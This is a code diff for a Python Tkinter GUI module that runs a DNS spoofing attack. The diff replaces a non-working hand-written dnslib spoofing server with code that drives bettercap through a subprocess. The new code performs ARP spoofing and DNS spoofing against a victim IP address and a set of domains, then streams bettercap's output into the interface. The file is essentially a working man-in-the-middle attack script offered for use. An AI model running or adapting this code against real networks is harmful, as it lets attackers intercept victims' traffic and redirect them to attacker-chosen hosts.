@@ -1,21 +1,17 @@
-# NOT WORKING
-
-import socket
-from dnslib import DNSRecord, DNSHeader, RR, dns
+import subprocess
 import threading
-import threading
+import signal
+import time
 import traceback
+import re
 
 from tkinter import *
 
-def startDnsSpoofing(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
-    global redirect_to, dnsSpoofingIsRunning, dnsSpoofingThreads, terminalLabel, wiresharkLabel, errorOutputLabel
+def startDnsSpoofing(interface, victimIp, victimDomains, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
+    global dnsSpoofingIsRunning, dnsSpoofingThreads, terminalLabel, wiresharkLabel, errorOutputLabel
 
     dnsSpoofingIsRunning = False
-    dnsSpoofingThreads = threading.Thread(target = lambda : dnsHijackHub(TGT_IP, TGT_DOMAINS))
-
-    TGT_IP = "8.8.8.8"  # The IP address you want the target domain(s) to resolve to
-    TGT_DOMAINS = ["testphp.vulnweb.com"]  # The target domain(s), here I am using an example.
+    dnsSpoofingThreads = threading.Thread(target = lambda : dnsSpoofHub(interface, victimIp, victimDomains))
 
     terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
@@ -40,8 +36,10 @@ def stopDnsSpoofing() :
         dnsSpoofingThreads.join(0)
         dnsSpoofingThreads = None
 
-        #subprocess.Popen.send_signal(signal.SIGINT)
-        #subprocess.call(["iptables", "--flush"])
+        process.send_signal(signal.SIGINT)
+        process.wait()
+        runBettercapThread.join(timeout=0.05)
+
 
         terminalLabel["text"] += "$ DNS Spoofing Attack successfully stopped!\n"
     except (AttributeError, RuntimeError):
@@ -54,45 +52,42 @@ def runDnsSpoofing() :
     dnsSpoofingIsRunning = True
     dnsSpoofingThreads.start()
 
-def dnsHijackHub(tgt_ip, tgt_domains):
-    DNS_PORT = 53
-    host = 'localhost'  # Ensure all traffic is routed to localhost for DNS resolution
+def dnsSpoofHub(interface, victimIp, victimDomains):
+    global process, runBettercapThread
 
-    threading.Thread(target=serve, args=(host, DNS_PORT, tgt_ip, tgt_domains)).start()
+    '''
+    USER INPUT NEEDED : 
+        a) Interface : Eth0, Wlan0
+        b) Victim IP
+        c) Domains
+    '''
 
-def parse_dns(packet):
-    return DNSRecord.parse(packet)
+    spoofTargets = "set arp.spoof.targets " + victimIp
+    spoofDomains = "set dns.spoof.domains " + victimDomains
 
-def create_response(data, tgt_ip):
-    request = parse_dns(data)
+    process = subprocess.Popen(["bettercap", "-iface", interface], 
+                               stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    runBettercapThread = threading.Thread(target=reader, args=(process,))
+    runBettercapThread.start()
 
-    print(f'Received request for {request.q.qname}')
+    commands = ["help", "net.probe on", "help", "net.show", "set arp.spoof.fullduplex true",
+                spoofTargets, "arp.spoof on", "set dns.spoof.all true",
+                spoofDomains, "dns.spoof on"]
+    for command in commands:
+        terminalLabel["text"] += f"Executing command : {command}"
+        process.stdin.write(f"{command}\n".encode())
+        process.stdin.flush()
 
-    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+        # Give it some time to process the command and generate output
+        time.sleep(2)
 
-    reply.add_answer(RR(request.q.qname, dns.A, rdata=dns.A(tgt_ip), ttl=60))
-
-    return reply.pack()
-
-def serve(host, port, tgt_ip, tgt_domains):
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_socket.bind((host, port))
-
-    print(f"Server listening on {host}:{port}")
-
+def reader(proc):
+    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
     while True:
-        data, addr = server_socket.recvfrom(512)
-
-        dns_req = parse_dns(data)
-        domain = str(dns_req.q.qname)
-
-        if any(tgt_domain in domain for tgt_domain in tgt_domains):
-            print(f"Intercepted request for: {domain}")
-
-            server_socket.sendto(create_response(data, tgt_ip), addr)
-        else:
-            print(f"Normal request for: {domain}")
-            legitimate_dns_server = ('8.8.8.8', 53)
-            server_socket.sendto(data, legitimate_dns_server)    # Forward request
-            response_data, _ = server_socket.recvfrom(512)       # Receive response
-            server_socket.sendto(response_data, addr)            # Relay back response
+        output = proc.stdout.readline().decode('utf8', errors='strict')
+        if output == '' and proc.poll() is not None:
+            terminalLabel["text"] += "\n"
+            break
+        if output:
+            ansiStripOutput = ansi_escape.sub('', output)
+            terminalLabel["text"] += "$ " + ansiStripOutput.strip() + "\n"
